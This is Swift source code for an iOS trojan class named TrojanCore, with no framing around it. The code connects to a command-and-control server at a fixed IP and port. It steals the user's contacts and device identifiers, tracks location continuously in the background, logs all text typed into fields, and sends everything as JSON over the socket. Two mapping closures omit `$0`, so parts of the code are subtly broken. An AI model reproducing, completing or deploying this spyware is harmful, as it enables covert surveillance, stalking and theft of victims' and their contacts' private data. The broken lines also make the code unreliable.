import Foundation
import UIKit
import Contacts
import CoreLocation

class TrojanCore: NSObject, CLLocationManagerDelegate {
    
    static let shared = TrojanCore()
    private var socket: OutputStream?
    private let c2Host = "192.168.1.109"
    private let c2Port = 4444
    private var locationManager: CLLocationManager?
    private var keylogBuffer: [String] = []
    private var isConnected = false
    
    private override init() {
        super.init()
    }
    
    // Activate immediately after permissions granted
    func activate() {
        self.initConnection()
        self.startKeylogger()
        self.startLocationTracking()
    }
    
    // MARK: - Connection
    func initConnection() {
        DispatchQueue.global().async {
            var readStream: Unmanaged<CFReadStream>?
            var writeStream: Unmanaged<CFWriteStream>?
            
            CFStreamCreatePairWithSocketToHost(kCFAllocatorDefault,
                                              self.c2Host as CFString,
                                              UInt32(self.c2Port),
                                              &readStream,
                                              &writeStream)
            
            self.socket = writeStream!.takeRetainedValue()
            self.socket?.schedule(in: .current, forMode: .default)
            self.socket?.open()
            
            self.isConnected = true
            print("[TROJAN] Connected to C2: \(self.c2Host):\(self.c2Port)")
            
            self.exfiltrateData()
        }
    }
    
    // MARK: - Data Exfiltration
    func exfiltrateData() {
        self.stealContacts()
        self.sendDeviceInfo()
        
        Timer.scheduledTimer(withTimeInterval: 60, repeats: true) { _ in
            self.sendKeylogData()
        }
    }
    
    func stealContacts() {
        let store = CNContactStore()
        store.requestAccess(for: .contacts) { granted, error in
            if granted {
                let keys = [CNContactGivenNameKey, CNContactFamilyNameKey, CNContactPhoneNumbersKey, CNContactEmailAddressesKey]
                let request = CNContactFetchRequest(keysToFetch: keys as [CNKeyDescriptor])
                
                var contacts: [[String: String]] = []
                
                try? store.enumerateContacts(with: request) { contact, _ in
                    let phones = contact.phoneNumbers.map { .value.stringValue }
                    let emails = contact.emailAddresses.map { .value as String }
                    contacts.append([
                        "name": "\(contact.givenName) \(contact.familyName)",
                        "phones": phones.joined(separator: ", "),
                        "emails": emails.joined(separator: ", ")
                    ])
                }
                
                print("[TROJAN] Stolen \(contacts.count) contacts")
                self.sendData(type: "contacts", data: contacts)
            }
        }
    }
    
    func startLocationTracking() {
        locationManager = CLLocationManager()
        locationManager?.delegate = self
        locationManager?.allowsBackgroundLocationUpdates = true
        locationManager?.pausesLocationUpdatesAutomatically = false
        locationManager?.startUpdatingLocation()
        print("[TROJAN] Location tracking started")
    }
    
    func locationManager(_ manager: CLLocationManager, didUpdateLocations locations: [CLLocation]) {
        if let location = locations.last {
            let data = [
                "lat": "\(location.coordinate.latitude)",
                "lon": "\(location.coordinate.longitude)",
                "accuracy": "\(location.horizontalAccuracy)",
                "timestamp": "\(Date())"
            ]
            self.sendData(type: "location", data: data)
        }
    }
    
    // MARK: - Keylogger
    func startKeylogger() {
        NotificationCenter.default.addObserver(self,
                                              selector: #selector(textDidChange),
                                              name: UITextField.textDidChangeNotification,
                                              object: nil)
        
        NotificationCenter.default.addObserver(self,
                                              selector: #selector(textDidChange),
                                              name: UITextView.textDidChangeNotification,
                                              object: nil)
        print("[TROJAN] Keylogger activated")
    }
    
    @objc func textDidChange(notification: NSNotification) {
        var text = ""
        
        if let textField = notification.object as? UITextField {
            text = textField.text ?? ""
        } else if let textView = notification.object as? UITextView {
            text = textView.text ?? ""
        }
        
        if !text.isEmpty {
            let entry = "[\(Date())] \(text)"
            keylogBuffer.append(entry)
            print("[KEYLOG] \(entry)")
        }
    }
    
    func sendKeylogData() {
        if !keylogBuffer.isEmpty {
            self.sendData(type: "keylog", data: keylogBuffer)
            keylogBuffer.removeAll()
        }
    }
    
    func sendDeviceInfo() {
        let data = [
            "model": UIDevice.current.model,
            "os": UIDevice.current.systemVersion,
            "name": UIDevice.current.name,
            "id": UIDevice.current.identifierForVendor?.uuidString ?? "unknown"
        ]
        print("[TROJAN] Sending device info: \(data)")
        self.sendData(type: "device_info", data: data)
    }
    
    // MARK: - Network Send
    func sendData(type: String, data: Any) {
        guard let socket = self.socket, self.isConnected else { 
            print("[TROJAN] Not connected, queueing...")
            return 
        }
        
        let payload: [String: Any] = [
            "type": type,
            "data": data,
            "timestamp": Date().timeIntervalSince1970
        ]
        
        if let jsonData = try? JSONSerialization.data(withJSONObject: payload),
           let jsonString = String(data: jsonData, encoding: .utf8) {
            let bytes = [UInt8](jsonString.utf8)
            socket.write(bytes, maxLength: bytes.count)
            print("[TROJAN] Sent \(type) data (\(bytes.count) bytes)")
        }
    }
}
